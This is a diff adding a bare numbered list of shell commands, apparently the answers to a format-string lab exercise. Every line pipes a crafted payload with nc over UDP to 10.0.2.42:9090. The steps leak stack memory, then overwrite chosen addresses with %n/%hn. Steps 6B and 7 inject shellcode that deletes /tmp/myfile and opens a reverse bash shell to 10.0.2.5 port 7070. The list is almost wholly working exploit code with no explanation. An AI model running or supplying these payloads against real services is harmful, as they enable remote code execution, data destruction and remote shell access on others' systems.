@@ -1,0 +1,25 @@
+1. echo hello .%x.%x.%x.%x.%x.%x.%x.%s |nc -u 10.0.2.42 9090
+
+2. echo hello .%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x | nc -u 10.0.2.42 9090
+
+3. echo %s. %s. %s. %s. %s. %s. %s. %s. %s. %s. %s. %s. %s. %s. %s. | nc -u 10.0.2.42 9090
+
+4A. echo @@@@.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x | nc -u 10.0.2.42 9090
+
+4B. echo $(printf "\xc0\x87\x04\x08").%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%s | nc -u 10.0.2.42 9090
+
+5A. echo $(printf "\x40\xa0\x04\x08").%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n | nc -u 10.0.2.42 9090
+
+5B. echo $(printf "\x40\xa0\x04\x08").%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%.1076x.%n | nc -u 10.0.2.42 9090
+
+5C. echo $(printf "\x40\xa0\x04\x08@@@@\x42\xa0\x04\x08").%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%.65324x.%hn.%x.%hn | nc -u 10.0.2.42 9090
+
+6A. echo $(printf "\x40\xa0\x04\x08@@@@\x42\xa0\x04\x08").%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%.61596x.%hn.%52877x.%hn | nc -u 10.0.2.42 9090
+
+6B. echo $(printf "\x8c\xf0\xff\xbf@@@@\x8e\xf0\xff\xbf").%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%.61596x.%hn.%52877x.%hn $(printf "\x90\x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x31\xc0\x50\x68bash\x68////\x68/bin\x89\xe3\x31\xc0\x50\x68 – ccc\x89\xe0\x31\xd2\x52\x68ile./myf\x68/tmp\x68/rm \x68/bin\x89\xe2\x31\xc9\x51\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80")| nc -u 10.0.2.42 9090
+
+7. echo $(printf "\x8c\xf0\xff\xbf@@@@\x8e\xf0\xff\xbf").%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%.61596x.%hn.%52877x.%hn $(printf "\x90\x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x31\xc0\x50\x68bash\x68////\x68/bin\x89\xe3\x31\xc0\x50\x68 –ccc\x89\xe0\x31\xd2\x52\x682>&1\x68<&1\x6870 0\x686/70\x68.2.5\x6810.0\x68tcp/\x68dev/\x68 > /\x68h -I \x68/bas \x68/bin\x89\xe2\x31\xc9\x51\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80")| nc -u 10.0.2.42 9090
+
+8. echo hello .%x.%x.%x.%x.%x.%x.%x |nc -u 10.0.2.42 9090    
+
+
